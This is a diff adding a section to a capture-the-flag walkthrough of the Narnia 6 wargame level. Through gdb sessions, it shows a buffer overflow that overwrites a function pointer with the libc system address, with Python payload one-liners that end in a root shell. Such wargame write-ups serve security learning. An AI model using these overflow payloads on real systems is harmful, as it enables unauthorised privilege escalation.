@@ -228,6 +228,67 @@ Continuing.
 AAAAAAAAЃ[Inferior 1 (process 4288) exited with code 01]
 >```
 >
-> Wow. It worked. We can see the address overwritten ```0xffffd4e8``` with ```0x080483d0``` and then when we continue execution we see the results of ```fp(b1)```, which is our first parameter being printed via ```printf```. Now we need to find something that we can spawn a shell with.  There doesn't appear to be anything helpful in the application itself, so let's start looking and what the libraries provide. The first library ```stdio.h```just basically has all of the functions necessary to read/write to various streams (files, stdin, stdout, ect).  We could potentially try to use one of those functions to read the ```/etc/narnia_pass/narnia7``` file, but it doesn't look like it would be an easy setup.  Moving to ```stdlib.h``` we have a few more interesting options.  This library seems like a grab bag.  There are functions for generating random numbers, functions for converting data types, but it also has functions for grabbing environment data and running OS commands.  The latter, ```system``` function, seems to fit the bill the best.  The only problem is I don't see an address for ```system``` like I did for ```printf```. After a quick [google search](https://www.google.com/search?client=safari&rls=en&q=gdb+break+on+library+function&ie=UTF-8&oe=UTF-8) it looks like something like ```(gdb) break system``` should work.  It never hurts to try.
+> Wow. It worked. We can see the address overwritten ```0xffffd4e8``` with ```0x080483d0``` and then when we continue execution we see the results of ```fp(b1)```, which is our first parameter being printed via ```printf```. Now we need to find something that we can spawn a shell with.  There doesn't appear to be anything helpful in the application itself, so let's start looking and what the libraries provide. The first library ```stdio.h```just basically has all of the functions necessary to read/write to various streams (files, stdin, stdout, ect).  We could potentially try to use one of those functions to read the ```/etc/narnia_pass/narnia7``` file, but it doesn't look like it would be an easy setup.  Moving to ```stdlib.h``` we have a few more interesting options.  This library seems like a grab bag.  There are functions for generating random numbers, functions for converting data types, but it also has functions for grabbing environment data and running OS commands.  The latter, ```system``` function, seems to fit the bill the best.  The only problem is I don't see an address for ```system``` like I did for ```printf```. After a quick [google search](https://www.google.com/search?client=safari&rls=en&q=gdb+break+on+library+function&ie=UTF-8&oe=UTF-8) it looks like something like ```(gdb) break system``` should work.  It never hurts to try and ```break system``` sounds like an awesome command anyway.
 >
-> TODO
+>```
+(gdb) break system
+Breakpoint 2 at 0xf7e92c30
+>```
+>
+> Wow. Before we even executed anything it gave us the address for the ```system``` function.  Let's plug it in and see what we get.
+>
+>```
+(gdb) run $(python -c 'print "A"*8+"\x30\x2c\xe9\xf7"') $(python -c 'print "B"*4')
+Starting program: /root/narnia6 $(python -c 'print "A"*8+"\x30\x2c\xe9\xf7"') $(python -c 'print "B"*4')
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
+>
+Breakpoint 2, 0xf7e92c30 in system () from /lib/i386-linux-gnu/i686/cmov/libc.so.6
+(gdb) c
+Continuing.
+sh: 1: AAAAAAAA0,��: not found
+[Inferior 1 (process 4352) exited with code 01]
+>```
+>
+> Dude. It clearly worked, but it looks like it's using all of the first parameter as input.  Maybe we need to play with that second parameter a bit, remember, in the begining it looked like we could overwrite what appeared to be a return with 20 characters.
+>
+>```
+(gdb) break *0x08048687
+Breakpoint 3 at 0x8048687
+(gdb) run $(python -c 'print "A"*8+"\x30\x2c\xe9\xf7"') $(python -c 'print "B"*12')
+Starting program: /root/narnia6 $(python -c 'print "A"*8+"\x30\x2c\xe9\xf7"') $(python -c 'print "B"*12')
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
+>
+Breakpoint 3, 0x08048687 in main ()
+(gdb) x/50x $esp
+0xffffd4b0:	0xffffd4c8	0xffffd705	0x00000036	0x08048712
+0xffffd4c0:	0x00000003	0xffffd594	0x42424242	0x42424242
+0xffffd4d0:	0x42424242	0x41414100	0xf7e92c30	0x00000000
+0xffffd4e0:	0x080486c0	0xf7fb6ff4	0xffffd568	0xf7e6de46
+0xffffd4f0:	0x00000003	0xffffd594	0xffffd5a4	0xf7fdb860
+0xffffd500:	0xf7ff4821	0xffffffff	0xf7ffcff4	0x080482d0
+0xffffd510:	0x00000001	0xffffd550	0xf7fedc16	0xf7ffdac0
+0xffffd520:	0xf7fdbb58	0xf7fb6ff4	0x00000000	0x00000000
+0xffffd530:	0xffffd568	0x58143abd	0x6a01ccad	0x00000000
+0xffffd540:	0x00000000	0x00000000	0x00000003	0x08048450
+0xffffd550:	0x00000000	0xf7ff39c0	0xf7e6dd6b	0xf7ffcff4
+0xffffd560:	0x00000003	0x08048450	0x00000000	0x08048471
+0xffffd570:	0x08048559	0x00000003
+(gdb) c
+Continuing.
+sh: 1: BBBB: not found
+[Inferior 1 (process 4367) exited with code 01]
+>```
+>
+> Ah, nice. By overflowing the buffer we started to overwrite the begining of the first parameter and the ```system``` call tried to execute based off of the second parameter instead of the first. Let's substitute ```B``` for ```/bin/sh```.
+>
+>```
+(gdb) run $(python -c 'print "A"*8+"\x30\x2c\xe9\xf7"') $(python -c 'print "B"*8+"/bin/sh"')
+Starting program: /root/narnia6 $(python -c 'print "A"*8+"\x30\x2c\xe9\xf7"') $(python -c 'print "B"*8+"/bin/sh"')
+# whoami
+root
+# 
+>```
+>
+> I almost done want this one to end.  I've learned a lot and it feels like we've been rewarded at every turn.  Let's head to the server and get the password knowing we may have to do a bit of remapping.
+>
+>
